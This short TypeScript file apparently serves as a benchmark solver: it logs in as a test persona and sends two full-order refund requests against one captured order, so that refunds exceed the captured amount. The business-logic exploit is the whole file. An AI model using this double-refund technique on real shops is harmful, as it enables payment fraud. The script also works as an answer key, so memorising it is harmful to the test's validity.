// Draw two full-order-total refunds against the store's single captured order, so the booked refunds
// together exceed the amount that was actually captured.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const amountField = ctx.plan.params['bodyAmount'] ?? 'amount'
  const path = buildPath(ctx.plan, 'createRefundLine')
  const draw = (): Promise<Response> =>
    ctx.fetch(path, {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: `${encodeURIComponent(amountField)}=3400`,
    })
  await draw()
  await draw()
}
